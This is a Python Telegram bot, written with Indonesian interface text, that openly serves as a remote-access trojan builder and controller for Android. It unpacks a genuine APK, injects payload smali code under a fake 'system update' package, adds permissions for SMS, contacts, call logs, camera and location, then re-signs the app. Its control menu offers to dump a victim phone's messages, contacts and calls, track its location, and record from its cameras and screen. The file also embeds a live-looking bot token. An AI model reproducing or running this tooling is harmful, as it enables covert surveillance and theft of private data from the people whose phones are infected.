import os
import subprocess
import logging
import shutil
import uuid
import zipfile
import xml.etree.ElementTree as ET
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ── KONFIGURASI ──
TOKEN = "9153767226:AAG9WkQcikOjpFiwWKpQ8GkRC92xOUO92sc" 
ALLOWED_CHAT_ID = 8598136412 

WORK_DIR = "/data/data/com.termux/files/home/r4t" 
KEYSTORE_PATH = f"{WORK_DIR}/app_debug.keystore"
KEYSTORE_PASS = "123456"
KEY_ALIAS = "debugkey"
PAYLOAD_SMALI_DIR = f"{WORK_DIR}/payload_smali/com/system/update"

os.makedirs(WORK_DIR, exist_ok=True)
logging.disable(logging.CRITICAL)

user_states = {} 

def is_authorized(update: Update):
    return update.effective_chat.id == ALLOWED_CHAT_ID

def inject_manifest(manifest_path):
    tree = ET.parse(manifest_path)
    root = tree.getroot()
    ns = '{http://schemas.android.com/apk/res/android}'
    
    permissions = ["android.permission.INTERNET", "android.permission.READ_SMS", "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.ACCESS_FINE_LOCATION"]
    for perm in permissions:
        if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
            ET.SubElement(root, 'uses-permission', {ns + 'name': perm})

    app = root.find('application')
    if app is not None:
        if not any(s.get(ns + 'name') == '.Payload' for s in app.findall('service')):
            ET.SubElement(app, 'service', {ns + 'name': '.Payload', ns + 'enabled': 'true', ns + 'exported': 'false'})
    tree.write(manifest_path, encoding='utf-8', xml_declaration=True)

# ── TAMPILAN START ──
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    
    chat_id = update.effective_chat.id
    user_states.pop(chat_id, None) 

    banner = (
        "```\n"
        "███╗   ███╗██████╗ ██╗  ██╗ ██╗ ██╗  ███╗  ███╗       ██╗██████╗ \n"
        "████╗ ████║██╔══██╗██║  ██║ ██║ ██║ ██╔██╗ ██╔██╗      ██║██╔══██╗\n"
        "██╔████╔██║██████╔╝███████║ ███████║██╔╝██╗██╔╝██╗     ██║██║  ██║\n"
        "██║╚██╔╝██║██╔══██╗╚════██║ ╚════██║██████╔╝██████╔╝   ██║██║  ██║\n"
        "██║ ╚═╝ ██║██║  ██║      ██║      ██║╚═██╔═╝╚═██╔═╝    ██║██████╔╝\n"
        "╚═╝     ╚═╝╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝    ╚═╝     ╚═╝╚═════╝ \n"
        "```\n"
        "✨ **RAT BUILDER & CONTROLLER** ✨\n"
        "Status: 🟢 Online\n\n"
        "Silakan pilih menu:"
    )
    
    keyboard = [
        [InlineKeyboardButton("📦 Build APK Baru", callback_data="menu_build")],
        [InlineKeyboardButton("📱 List Device Ter-Sadap", callback_data="menu_device")],
        [InlineKeyboardButton("💾 Backup Data (Pindah HP)", callback_data="menu_backup")]
    ]
    
    if update.callback_query:
        await update.callback_query.edit_message_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.message.reply_text(banner, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ── HANDLER TOMBOL ──
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not is_authorized(update): return
    
    chat_id = update.effective_chat.id

    if query.data == "menu_build":
        user_states[chat_id] = "waiting_apk"
        await query.edit_message_text(
            "📦 **Build APK Baru**\n\n"
            "Silakan kirim file `.apk` asli yang mau disusupi RAT sekarang.",
            parse_mode='Markdown'
        )

    elif query.data == "menu_device":
        keyboard = [
            [InlineKeyboardButton("📱 HP Korban 1", callback_data="device_1")],
            [InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]
        ]
        await query.edit_message_text(
            "📱 **List Device Ter-Sadap**\n\n"
            "Pilih device untuk melihat menu kontrol:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    elif query.data == "menu_backup":
        await query.edit_message_text("⏳ Sedang membackup semua data...")
        zip_path = f"{WORK_DIR}/backup_r4t.zip"
        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in ["builder_bot.py", "app_debug.keystore", "zipalign", "devices.db"]:
                    filepath = f"{WORK_DIR}/{file}"
                    if os.path.exists(filepath):
                        zipf.write(filepath, file)
                
                if os.path.exists(f"{WORK_DIR}/payload_smali"):
                    for root, dirs, files in os.walk(f"{WORK_DIR}/payload_smali"):
                        for file in files:
                            filepath = os.path.join(root, file)
                            arcname = os.path.relpath(filepath, WORK_DIR)
                            zipf.write(filepath, arcname)

            with open(zip_path, "rb") as f:
                await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename="backup_r4t.zip")
            
            os.remove(zip_path)
            await query.message.reply_text("✅ **Backup Berhasil!** File `.zip` udah dikirim di atas.")
            await start(update, context)
        except Exception as e:
            await query.message.reply_text(f"❌ Gagal Backup: {e}")
            await start(update, context)

    elif query.data == "back_start":
        await start(update, context)
        
    elif query.data == "device_1":
        keyboard = [
            [InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📤 Send File", callback_data="cmd_send_file")],
            [InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms"), InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon")],
            [InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak"), InlineKeyboardButton("📍 Lacak Lokasi", callback_data="cmd_lacak")],
            [InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan"), InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],
            [InlineKeyboardButton("🎥 Rekam Depan", callback_data="cmd_rekam_depan"), InlineKeyboardButton("🎥 Rekam Belakang", callback_data="cmd_rekam_belakang")],
            [InlineKeyboardButton("🖼️ Screenshot", callback_data="cmd_ss"), InlineKeyboardButton("⏺️ Screen Record", callback_data="cmd_screen_record")],
            [InlineKeyboardButton("🌐 Buka URL", callback_data="cmd_buka_url")],
            [InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]
        ]
        await query.edit_message_text(
            "🎮 **Menu Kontrol HP Korban**\nPilih aksi yang ingin dijalankan:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    elif query.data.startswith("cmd_"):
        perintah = "/" + query.data.replace("cmd_", "")
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=perintah)
        await query.message.reply_text(f"⏳ Perintah `{perintah}` berhasil dikirim ke HP korban.\n*(Tunggu beberapa detik...)*", parse_mode='Markdown')

# ── PROSES BUILD APK ──
async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_path: str, file_name: str):
    await update.message.reply_text(f"⏳ Menerima APK: `{file_name}`\nSedang memproses inject otomatis...", parse_mode='Markdown')
    session_id = str(uuid.uuid4())[:8]
    session_dir = f"{WORK_DIR}/build_{session_id}"
    apk_out_dir = f"{session_dir}/decoded"
    apk_new_path = f"{session_dir}/modded.apk"
    
    try:
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔧 [1/5] Membongkar APK...")
        subprocess.run(f"apktool d '{file_path}' -o '{apk_out_dir}' -f", shell=True, check=True, capture_output=True)

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="💉 [2/5] Menyuntikkan kode RAT...")
        target_smali_dir = f"{apk_out_dir}/smali/com/system/update"
        os.makedirs(target_smali_dir, exist_ok=True)
        if os.path.exists(PAYLOAD_SMALI_DIR):
            for smali_file in os.listdir(PAYLOAD_SMALI_DIR):
                if smali_file.endswith(".smali"):
                    shutil.copy(os.path.join(PAYLOAD_SMALI_DIR, smali_file), target_smali_dir)
        else:
            raise Exception(f"Folder {PAYLOAD_SMALI_DIR} tidak ditemukan! Pastikan udah diekstrak.")

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📝 [3/5] Menyuntikkan Izin ke Manifest...")
        inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📦 [4/5] Merakit ulang APK...")
        subprocess.run(f"apktool b '{apk_out_dir}' -o '{apk_new_path}'", shell=True, check=True, capture_output=True)

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
        signed_apk = f"{apk_new_path}.signed.apk"
        
        # NGGAK PAKE JAR LAGI, LANGSUNG PANGGIL ZIPALIGN BAWAAN TERMUX
        subprocess.run(f"zipalign -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)

        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
        with open(signed_apk, "rb") as f:
            await context.bot.send_document(chat_id=ALLOWED_CHAT_ID, document=f, filename=f"MOD_{file_name}")
            
        await start(update, context)
            
    except subprocess.CalledProcessError as e:
        error_msg = e.stderr.decode('utf-8') if e.stderr else str(e)
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"❌ **GAGAL BUILD:**\n```\n{error_msg[:1000]}\n```", parse_mode='Markdown')
    except Exception as e:
        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text=f"❌ Error: {e}")
    finally:
        if os.path.exists(file_path): os.remove(file_path)
        if os.path.exists(session_dir): shutil.rmtree(session_dir)
        user_states.pop(ALLOWED_CHAT_ID, None)

# ── HANDLER NERIMA FILE ──
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update): return
    
    if user_states.get(ALLOWED_CHAT_ID) != "waiting_apk":
        await update.message.reply_text("❌ Klik menu **Build APK Baru** dulu sebelum mengirim file.")
        return

    doc = update.message.document
    if not doc or not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("❌ File harus berekstensi `.apk`")
        return 

    await update.message.reply_text("⏳ Mendownload APK...")
    file = await context.bot.get_file(doc.file_id)
    temp_apk_path = f"{WORK_DIR}/{doc.file_name}"
    await file.download_to_drive(temp_apk_path)
    
    await process_apk(update, context, temp_apk_path, doc.file_name)

def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("🤖 Bot Builder & Controller nyala...")
    app.run_polling()

if __name__ == '__main__':
    main()
